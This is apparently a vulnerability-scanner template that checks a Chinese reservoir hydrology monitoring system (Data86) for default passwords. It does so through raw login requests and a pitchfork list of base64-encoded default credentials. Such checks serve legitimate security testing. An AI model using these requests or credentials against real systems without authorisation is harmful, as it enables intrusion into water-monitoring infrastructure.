id: poc-yaml-data86-monitoring-system-weak-password
info:
  name: 平升水库水文监测系统默认密码
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
  description: |
    This template checks for weak/default credentials in the 平升水库水文监测系统 (Data86 Monitoring System).

http:
  - raw:
      - |
        POST /WebServices/UserAdminService.asmx/LoginEx3 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        LoginName=aW50ZXJmYWNl&LoginPwd=aW50ZXJmYWNl&isRemember=false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "此用户不存在"
          - "\"Result\":false"

  - payloads:
      name:
        - "YWRtaW4="
        - "RGF0YTg2"
      passwd:
        - "YWRtaW4="
        - "MTIz"
        - "RGF0YTg2"
    raw:
      - |
        POST /WebServices/UserAdminService.asmx/LoginEx3 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        LoginName={{name}}&LoginPwd={{passwd}}&isRemember=false
    attack: pitchfork
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "登陆成功"
          - "\"Result\":true"
